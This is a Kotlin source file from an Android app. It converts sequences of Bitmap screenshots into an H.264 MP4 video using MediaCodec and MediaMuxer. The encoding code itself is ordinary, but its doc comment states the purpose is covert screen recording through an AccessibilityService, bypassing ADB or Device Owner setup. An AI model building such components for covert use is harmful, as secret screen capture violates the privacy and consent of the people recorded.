package com.izhaanintellect.pasa.camera

import android.graphics.Bitmap
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaMuxer
import android.util.Log
import java.io.File

/**
 * Encodes sequential Bitmap screenshots into a standard H.264 (AVC) MP4 video
 * using Android's native MediaCodec and MediaMuxer hardware pipelines.
 *
 * Allows covert screen recording via AccessibilityService without needing
 * ADB shell or Device Owner provisioning.
 */
object ScreenVideoEncoder {
    private const val TAG = "PASA_ScreenVideoEncoder"
    private const val MIME_TYPE = "video/avc"

    fun encodeBitmapsToMp4(
        frames: List<Bitmap>,
        outputFile: File,
        fps: Int = 2
    ): Boolean {
        if (frames.isEmpty()) return false

        // Normalize dimensions to multiples of 16 (required by H.264 hardware encoders)
        val first = frames.first()
        val targetWidth = (first.width.coerceAtMost(720) / 16) * 16
        val targetHeight = (first.height.coerceAtMost(1280) / 16) * 16

        var codec: MediaCodec? = null
        var muxer: MediaMuxer? = null

        try {
            val format = MediaFormat.createVideoFormat(MIME_TYPE, targetWidth, targetHeight).apply {
                setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar)
                setInteger(MediaFormat.KEY_BIT_RATE, 2_000_000) // 2 Mbps
                setInteger(MediaFormat.KEY_FRAME_RATE, fps)
                setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1)
            }

            codec = MediaCodec.createEncoderByType(MIME_TYPE)
            codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            codec.start()

            muxer = MediaMuxer(outputFile.absolutePath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)
            var trackIndex = -1
            var muxerStarted = false

            val bufferInfo = MediaCodec.BufferInfo()
            val frameDurationUs = (1_000_000L / fps)

            val yuvBuffer = ByteArray(targetWidth * targetHeight * 3 / 2)
            val argbBuffer = IntArray(targetWidth * targetHeight)

            for (i in frames.indices) {
                val rawBitmap = frames[i]
                val scaledBitmap = if (rawBitmap.width != targetWidth || rawBitmap.height != targetHeight) {
                    Bitmap.createScaledBitmap(rawBitmap, targetWidth, targetHeight, true)
                } else {
                    rawBitmap
                }

                scaledBitmap.getPixels(argbBuffer, 0, targetWidth, 0, 0, targetWidth, targetHeight)
                if (scaledBitmap != rawBitmap) {
                    scaledBitmap.recycle()
                }

                convertArgbToNv12(argbBuffer, yuvBuffer, targetWidth, targetHeight)

                val inputBufferIndex = codec.dequeueInputBuffer(10000L)
                if (inputBufferIndex >= 0) {
                    val inputBuffer = codec.getInputBuffer(inputBufferIndex)
                    if (inputBuffer != null) {
                        inputBuffer.clear()
                        inputBuffer.put(yuvBuffer)
                        val ptsUs = i * frameDurationUs
                        codec.queueInputBuffer(inputBufferIndex, 0, yuvBuffer.size, ptsUs, 0)
                    }
                }

                // Drain output
                while (true) {
                    val outIndex = codec.dequeueOutputBuffer(bufferInfo, 2000L)
                    if (outIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                        if (!muxerStarted) {
                            trackIndex = muxer.addTrack(codec.outputFormat)
                            muxer.start()
                            muxerStarted = true
                        }
                    } else if (outIndex >= 0) {
                        val encodedData = codec.getOutputBuffer(outIndex)
                        if (encodedData != null && bufferInfo.size > 0 && muxerStarted) {
                            encodedData.position(bufferInfo.offset)
                            encodedData.limit(bufferInfo.offset + bufferInfo.size)
                            muxer.writeSampleData(trackIndex, encodedData, bufferInfo)
                        }
                        codec.releaseOutputBuffer(outIndex, false)
                    } else {
                        break
                    }
                }
            }

            // End of stream
            val eosIndex = codec.dequeueInputBuffer(10000L)
            if (eosIndex >= 0) {
                codec.queueInputBuffer(
                    eosIndex,
                    0,
                    0,
                    frames.size * frameDurationUs,
                    MediaCodec.BUFFER_FLAG_END_OF_STREAM
                )
            }

            // Drain remaining EOS output
            while (true) {
                val outIndex = codec.dequeueOutputBuffer(bufferInfo, 10000L)
                if (outIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                    if (!muxerStarted) {
                        trackIndex = muxer.addTrack(codec.outputFormat)
                        muxer.start()
                        muxerStarted = true
                    }
                } else if (outIndex >= 0) {
                    val encodedData = codec.getOutputBuffer(outIndex)
                    if (encodedData != null && bufferInfo.size > 0 && muxerStarted) {
                        encodedData.position(bufferInfo.offset)
                        encodedData.limit(bufferInfo.offset + bufferInfo.size)
                        muxer.writeSampleData(trackIndex, encodedData, bufferInfo)
                    }
                    codec.releaseOutputBuffer(outIndex, false)
                    if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
                        break
                    }
                } else {
                    break
                }
            }

            return outputFile.exists() && outputFile.length() > 0

        } catch (e: Exception) {
            Log.e(TAG, "Error encoding video: ${e.message}", e)
            return false
        } finally {
            try { codec?.stop() } catch (_: Exception) {}
            try { codec?.release() } catch (_: Exception) {}
            try { muxer?.stop() } catch (_: Exception) {}
            try { muxer?.release() } catch (_: Exception) {}
        }
    }

    private fun convertArgbToNv12(argb: IntArray, nv12: ByteArray, width: Int, height: Int) {
        val frameSize = width * height
        var yIndex = 0
        var uvIndex = frameSize

        for (j in 0 until height) {
            for (i in 0 until width) {
                val c = argb[j * width + i]
                val r = (c shr 16) and 0xff
                val g = (c shr 8) and 0xff
                val b = c and 0xff

                val y = ((66 * r + 129 * g + 25 * b + 128) shr 8) + 16
                nv12[yIndex++] = y.coerceIn(0, 255).toByte()

                if (j % 2 == 0 && i % 2 == 0) {
                    val u = ((-38 * r - 74 * g + 112 * b + 128) shr 8) + 128
                    val v = ((112 * r - 94 * g - 18 * b + 128) shr 8) + 128
                    nv12[uvIndex++] = u.coerceIn(0, 255).toByte()
                    nv12[uvIndex++] = v.coerceIn(0, 255).toByte()
                }
            }
        }
    }
}
